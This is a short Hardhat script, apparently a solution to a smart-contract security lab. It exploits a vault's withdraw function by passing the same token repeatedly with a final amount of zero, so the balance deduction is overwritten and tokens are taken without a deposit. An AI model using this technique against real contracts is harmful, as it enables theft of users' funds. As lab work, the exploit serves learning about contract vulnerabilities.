// This setup uses Hardhat Ignition to manage smart contract deployments.
// Learn more about it at https://hardhat.org/ignition

const hre = require("hardhat");

async function main() {
  const [deployer] = await ethers.getSigners();

  //deploy lab1 contract
  const hre = require("hardhat");

  const [ owner ] = await hre.ethers.getSigners();
  console.log("Deploying with account:", owner.address);

  //do lab2
  const OnsiteW2Lab2Vault = await hre.ethers.getContractAt("OnsiteW2Lab2Vault", "0x2Ba2a2Cd0cB25bf061b16067F9Ff7FF971c2B6a2");
  const tokens = [
    "0x54E73fD8A779A335CDcEc7194a382F1F97bD4BA7",
    "0x54E73fD8A779A335CDcEc7194a382F1F97bD4BA7",
    "0x54E73fD8A779A335CDcEc7194a382F1F97bD4BA7",
    "0x54E73fD8A779A335CDcEc7194a382F1F97bD4BA7"
  ];
  const amounts = [
    "1000000000000000000000",
    "1",
    "1",
    "0"
  ];
  console.log("withdrawing")
  //do not need deposit, because each time toDeduct[tokens[i]] get replaced by the latest value
  // so if the last one is 0, then it wouldnt deduct anything
  const getTokens = await OnsiteW2Lab2Vault.withdraw(tokens, amounts);

  console.log("receive token hash", getTokens.hash);

}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });